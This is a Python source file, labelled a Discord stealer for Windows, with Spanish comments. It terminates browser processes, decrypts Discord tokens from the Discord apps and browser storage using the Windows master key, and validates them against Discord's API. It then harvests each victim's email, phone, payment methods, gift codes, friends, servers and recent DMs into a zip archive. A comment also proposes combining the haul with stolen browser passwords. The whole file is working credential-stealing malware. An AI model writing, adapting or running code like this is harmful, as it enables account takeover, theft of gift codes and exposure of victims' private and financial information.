# language: Python 3, file: discord_token.py, target: Windows 10/11
# Discord stealer extendido:
# tokens (Discord app + browsers), account info, billing, gift codes,
# backup codes, friends list, guild list, DMs recientes

import os, re, json, base64, psutil, requests
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES

DISCORD_API = "https://discord.com/api/v9"


# ─────────────────────────────────────────────
# HELPERS INTERNOS
# ─────────────────────────────────────────────

def _get_master_key(local_state_path: str) -> bytes | None:
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            state = json.load(f)
        enc_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except Exception:
        return None

def _decrypt_val(buff: bytes, master_key: bytes) -> str:
    try:
        iv      = buff[3:15]
        payload = buff[15:]
        cipher  = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
    except Exception:
        return ""

def _validate_token(token: str) -> bool:
    try:
        r = requests.get(
            f"{DISCORD_API}/users/@me",
            headers={"Authorization": token},
            timeout=8
        )
        return r.status_code == 200
    except Exception:
        return False

def _auth_header(token: str) -> dict:
    return {"Authorization": token}


# ─────────────────────────────────────────────
# EXTRACCIÓN DE TOKENS
# ─────────────────────────────────────────────

def _extract_tokens() -> tuple[list[str], dict]:
    regexp     = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

    local  = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")

    paths = [
        ("Discord",         os.path.join(roaming, "discord",       "Local Storage", "leveldb"), ""),
        ("Discord Canary",  os.path.join(roaming, "discordcanary", "Local Storage", "leveldb"), ""),
        ("Discord PTB",     os.path.join(roaming, "discordptb",    "Local Storage", "leveldb"), ""),
        ("Lightcord",       os.path.join(roaming, "Lightcord",     "Local Storage", "leveldb"), ""),
        ("Google Chrome",   os.path.join(local,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"), "chrome.exe"),
        ("Google Chrome",   os.path.join(local,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"), "chrome.exe"),
        ("Google Chrome",   os.path.join(local,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"), "chrome.exe"),
        ("Microsoft Edge",  os.path.join(local,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"), "msedge.exe"),
        ("Brave",           os.path.join(local,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"), "brave.exe"),
        ("Opera",           os.path.join(roaming, "Opera Software", "Opera Stable",    "Local Storage", "leveldb"), "opera.exe"),
        ("Opera GX",        os.path.join(roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"), "opera.exe"),
        ("Vivaldi",         os.path.join(local,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"), "vivaldi.exe"),
        ("Yandex",          os.path.join(local,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
        ("Firefox",         os.path.join(roaming, "Mozilla", "Firefox", "Profiles"), "firefox.exe"),
    ]

    # terminar procesos de browser para liberar locks
    procs_to_kill = {p[2] for p in paths if p[2]}
    for proc in psutil.process_iter(['name']):
        try:
            if proc.name().lower() in procs_to_kill:
                proc.terminate()
        except Exception:
            pass

    tokens: list[str] = []
    uids:   list[str] = []
    token_info: dict  = {}

    for name, path, _ in paths:
        if not os.path.exists(path):
            continue

        disc_name = name.replace(" ", "").lower()
        is_discord_app = "cord" in path.lower() and not any(
            b in path.lower() for b in ["chrome", "edge", "brave", "opera", "vivaldi", "yandex", "firefox"]
        )

        if name == "Firefox":
            # Firefox: .sqlite files
            for root, _, files in os.walk(path):
                for fname in files:
                    if not fname.endswith('.sqlite'):
                        continue
                    fpath = os.path.join(root, fname)
                    try:
                        with open(fpath, errors='ignore') as f:
                            for line in f:
                                for tok in re.findall(regexp, line.strip()):
                                    if _validate_token(tok):
                                        uid = requests.get(f"{DISCORD_API}/users/@me", headers=_auth_header(tok), timeout=8).json().get('id')
                                        if uid and uid not in uids:
                                            tokens.append(tok)
                                            uids.append(uid)
                                            token_info[tok] = (name, fpath)
                    except Exception:
                        pass
            continue

        if is_discord_app:
            # app Discord: tokens encrypted con dQw4w9WgXcQ:
            local_state_path = os.path.join(roaming, disc_name, 'Local State')
            master_key = _get_master_key(local_state_path)
            if not master_key:
                continue

            for fname in os.listdir(path):
                if fname[-3:] not in ["log", "ldb"]:
                    continue
                fpath = os.path.join(path, fname)
                try:
                    with open(fpath, errors='ignore') as f:
                        for line in f:
                            for enc in re.findall(regexp_enc, line.strip()):
                                try:
                                    tok = _decrypt_val(
                                        base64.b64decode(enc.split('dQw4w9WgXcQ:')[1]),
                                        master_key
                                    )
                                    if tok and _validate_token(tok):
                                        uid = requests.get(f"{DISCORD_API}/users/@me", headers=_auth_header(tok), timeout=8).json().get('id')
                                        if uid and uid not in uids:
                                            tokens.append(tok)
                                            uids.append(uid)
                                            token_info[tok] = (name, fpath)
                                except Exception:
                                    pass
                except Exception:
                    pass
        else:
            # browsers: tokens en claro en leveldb
            for fname in os.listdir(path):
                if fname[-3:] not in ["log", "ldb"]:
                    continue
                fpath = os.path.join(path, fname)
                try:
                    with open(fpath, errors='ignore') as f:
                        for line in f:
                            for tok in re.findall(regexp, line.strip()):
                                if _validate_token(tok):
                                    uid = requests.get(f"{DISCORD_API}/users/@me", headers=_auth_header(tok), timeout=8).json().get('id')
                                    if uid and uid not in uids:
                                        tokens.append(tok)
                                        uids.append(uid)
                                        token_info[tok] = (name, fpath)
                except Exception:
                    pass

    return tokens, token_info


# ─────────────────────────────────────────────
# HARVEST EXTENDIDO POR TOKEN
# ─────────────────────────────────────────────

def _get_friends(token: str) -> str:
    """Lista de amigos con username, ID y tipo de relación."""
    try:
        r = requests.get(
            f"{DISCORD_API}/users/@me/relationships",
            headers=_auth_header(token),
            timeout=10
        )
        if r.status_code != 200:
            return "None"
        friends = r.json()
        if not friends:
            return "None"

        relation_types = {1: "Friend", 2: "Blocked", 3: "Incoming FR", 4: "Outgoing FR"}
        lines = []
        for f in friends[:50]:  # cap 50
            rtype = relation_types.get(f.get('type', 0), 'Unknown')
            user  = f.get('user', {})
            uname = user.get('username', 'Unknown')
            uid   = user.get('id', 'Unknown')
            lines.append(f"    [{rtype}] {uname} (ID: {uid})")
        return "\n".join(lines)
    except Exception:
        return "None"

def _get_guilds(token: str) -> str:
    """Lista de servidores con ID, nombre, permisos."""
    try:
        r = requests.get(
            f"{DISCORD_API}/users/@me/guilds",
            headers=_auth_header(token),
            timeout=10
        )
        if r.status_code != 200:
            return "None"
        guilds = r.json()
        if not guilds:
            return "None"

        lines = []
        for g in guilds[:30]:  # cap 30
            gid    = g.get('id', '?')
            gname  = g.get('name', '?')
            owner  = "Owner" if g.get('owner') else "Member"
            perms  = g.get('permissions', '0')
            # detectar admin
            is_admin = bool(int(perms) & 0x8) if str(perms).isdigit() else False
            admin_str = " [ADMIN]" if is_admin else ""
            lines.append(f"    {gname} (ID: {gid}) — {owner}{admin_str}")
        return "\n".join(lines)
    except Exception:
        return "None"

def _get_recent_dms(token: str) -> str:
    """DMs privados recientes — canal + último mensaje."""
    try:
        r = requests.get(
            f"{DISCORD_API}/users/@me/channels",
            headers=_auth_header(token),
            timeout=10
        )
        if r.status_code != 200:
            return "None"
        channels = r.json()
        if not channels:
            return "None"

        lines = []
        for ch in channels[:15]:  # cap 15 DMs
            ch_type = ch.get('type', -1)
            if ch_type == 1:  # DM
                recipients = ch.get('recipients', [{}])
                other = recipients[0] if recipients else {}
                uname = other.get('username', '?')
                uid   = other.get('id', '?')
                last  = ch.get('last_message_id', 'None')
                lines.append(f"    DM con {uname} (ID: {uid}) — last_msg_id: {last}")
            elif ch_type == 3:  # Group DM
                gname = ch.get('name') or 'Group DM'
                members = [u.get('username','?') for u in ch.get('recipients', [])]
                lines.append(f"    Group DM: {gname} — members: {', '.join(members[:5])}")
        return "\n".join(lines) if lines else "None"
    except Exception:
        return "None"

def _get_backup_codes(token: str) -> str:
    """
    Intenta obtener backup codes MFA.
    Solo funciona si MFA está habilitado y el token tiene los permisos necesarios.
    Nota: el endpoint requiere password — retorna el prompt en su lugar.
    """
    try:
        # verificar si tiene MFA primero
        me = requests.get(f"{DISCORD_API}/users/@me", headers=_auth_header(token), timeout=8).json()
        if not me.get('mfa_enabled'):
            return "MFA not enabled — no backup codes"

        # el endpoint real requiere password en body, no lo tenemos sin stealer de passwords
        # retornamos indicador + sugerencia de correlación con passwords robadas
        return "MFA enabled — correlate with stolen browser passwords to retrieve"
    except Exception:
        return "None"

def _get_billing(token: str) -> str:
    try:
        r = requests.get(
            f"{DISCORD_API}/users/@me/billing/payment-sources",
            headers=_auth_header(token),
            timeout=10
        )
        methods = r.json() if r.status_code == 200 else []
        if not methods:
            return "None"
        labels = {1: "Bank Card", 2: "PayPal", 3: "Cash App"}
        return " / ".join(labels.get(m.get('type', 0), 'Other') for m in methods)
    except Exception:
        return "None"

def _get_gift_codes(token: str) -> str:
    try:
        r = requests.get(
            f"{DISCORD_API}/users/@me/outbound-promotions/codes",
            headers=_auth_header(token),
            timeout=10
        )
        codes = r.json() if r.status_code == 200 else []
        if not codes:
            return "None"
        out = []
        for c in codes:
            title = c.get('promotion', {}).get('outbound_title', '?')
            code  = c.get('code', '?')
            out.append(f'"{title}" → {code}')
        return "\n    ".join(out)
    except Exception:
        return "None"

def _nitro_label(premium_type: int) -> str:
    return {0: "False", 1: "Nitro Classic", 2: "Nitro Boosts", 3: "Nitro Basic"}.get(premium_type, "False")


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────

def DiscordAccount(zip_file) -> int:
    tokens, token_info = _extract_tokens()

    if not tokens:
        zip_file.writestr("Discord Accounts (0).txt", "No discord tokens found.")
        return 0

    output_lines = []
    count = 0

    for token in tokens:
        count += 1
        try:
            me = requests.get(f"{DISCORD_API}/users/@me", headers=_auth_header(token), timeout=10).json()
        except Exception:
            me = {}

        username     = me.get('username', 'None') + '#' + me.get('discriminator', '0')
        display_name = me.get('global_name', 'None')
        uid          = me.get('id', 'None')
        email        = me.get('email', 'None')
        email_ver    = me.get('verified', 'None')
        phone        = me.get('phone', 'None')
        locale       = me.get('locale', 'None')
        mfa          = me.get('mfa_enabled', 'None')
        nitro        = _nitro_label(me.get('premium_type', 0))

        # avatar URL
        try:
            av_hash = me.get('avatar', '')
            av_url  = f"https://cdn.discordapp.com/avatars/{uid}/{av_hash}.gif"
            if requests.get(av_url, timeout=5).status_code != 200:
                av_url = f"https://cdn.discordapp.com/avatars/{uid}/{av_hash}.png"
        except Exception:
            av_url = "None"

        source_name, source_path = token_info.get(token, ("Unknown", "Unknown"))

        friends  = _get_friends(token)
        guilds   = _get_guilds(token)
        dms      = _get_recent_dms(token)
        billing  = _get_billing(token)
        gifts    = _get_gift_codes(token)
        backup   = _get_backup_codes(token)

        block = f"""
══════════════════════════════════════
Discord Account #{count}
══════════════════════════════════════
 Source          : {source_name}
 Path            : {source_path}
 Token           : {token}
 Username        : {username}
 Display Name    : {display_name}
 ID              : {uid}
 Email           : {email}
 Email Verified  : {email_ver}
 Phone           : {phone}
 Nitro           : {nitro}
 Locale          : {locale}
 MFA             : {mfa}
 Billing         : {billing}
 Gift Codes      : {gifts}
 Backup Codes    : {backup}
 Avatar          : {av_url}

[Friends]
{friends}

[Guilds / Servers]
{guilds}

[Recent DMs]
{dms}
"""
        output_lines.append(block)

    zip_file.writestr(f"Discord Accounts ({count}).txt", "\n".join(output_lines))
    return count
